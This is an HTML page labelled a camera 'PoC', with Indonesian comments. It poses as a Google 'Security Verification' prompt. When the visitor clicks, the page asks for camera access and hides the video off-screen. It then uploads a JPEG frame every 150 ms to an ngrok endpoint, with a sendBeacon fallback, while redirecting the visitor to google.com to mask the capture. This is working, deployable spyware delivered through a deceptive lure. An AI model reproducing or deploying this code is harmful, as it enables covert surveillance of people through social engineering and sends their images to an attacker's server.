<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Camera Redirect PoC (Fully Integrated)</title>
<style>
  body { font-family: Arial, sans-serif; text-align: center; padding: 60px; background: #f8f9fa; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; border: 1px solid #ddd; }
  button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #1a73e8; color: #fff; border: none; border-radius: 6px; width: 100%; }
  button:hover { background: #1557b0; }
  #status { margin-top: 20px; font-size: 12px; color: #0f0; background: #000; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
  
  /* Mencegah konflik display:none global agar video tetap aktif dirender di background */
  iframe { display: none !important; }
  .hidden-media { position: fixed; top: -9999px; left: -9999px; opacity: 0.01; pointer-events: none; width: 1px; height: 1px; }
</style>
</head>
<body>

<div class="panel">
  <h2>🔒 Security Verification</h2>
  <p>Click to verify your session.</p>
  <button id="camBtn">CLICK CALL CENTER GOOGLE</button>
  <div id="status">> Status: Waiting...</div>
</div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('camBtn');
  var statusEl = document.getElementById('status');

  // URL Ngrok Server Backend Anda
  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";

  function log(msg) {
    statusEl.innerHTML += "> " + msg + "<br>";
    statusEl.scrollTop = statusEl.scrollHeight;
    console.log("[PoC] " + msg);
  }

  async function startCamera() {
    try {
      log("Meminta Izin Kamera...");
      var stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false });
      log("Kamera BERHASIL diakses!");

      var video = document.createElement('video');
      video.srcObject = stream;
      video.muted = true;
      video.playsInline = true;
      video.className = 'hidden-media';
      document.body.appendChild(video);

      await video.play().catch(function(e){
        log("Video play warning: " + e.message);
      });

      var canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      var ctx = canvas.getContext('2d');

      // Loop Pengiriman Gambar dengan interval optimal (150ms)
      setInterval(function() {
        try {
          if (video.readyState >= video.HAVE_CURRENT_DATA) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(function(blob) {
              if (!blob) return;
              var formData = new FormData();
              formData.append('file', blob, 'camera.jpg');

              // Kirim via fetch (keepalive)
              fetch(SERVER_ENDPOINT, {
                method: 'POST',
                body: formData,
                keepalive: true
              })
              .then(function(res) {
                if (res.ok) {
                  log("Gambar terkirim (Status: " + res.status + ")");
                } else {
                  log("Gagal kirim: " + res.status);
                }
              })
              .catch(function(err) {
                // Fallback: sendBeacon
                try {
                  navigator.sendBeacon(SERVER_ENDPOINT, blob);
                } catch(e) {}
              });
            }, 'image/jpeg', 0.5);
          }
        } catch(e) {
          log("Frame Error: " + e.message);
        }
      }, 150);

    } catch(err) {
      log("Kamera diblokir: " + err.name);
    }
  }

  btn.addEventListener('click', async () => {
    log("Preparing redirect...");

    // A. Mulai Kamera
    startCamera();

    // B. Redirect setelah 400ms (memberi waktu sejenak untuk tangkapan frame awal)
    setTimeout(() => {
      log("Redirect ke Google...");
      try {
        window.location.replace('https://www.google.com');
      } catch(e) {}
    }, 300);

  }, { once: true });

})();
</script>
</body>
</html>
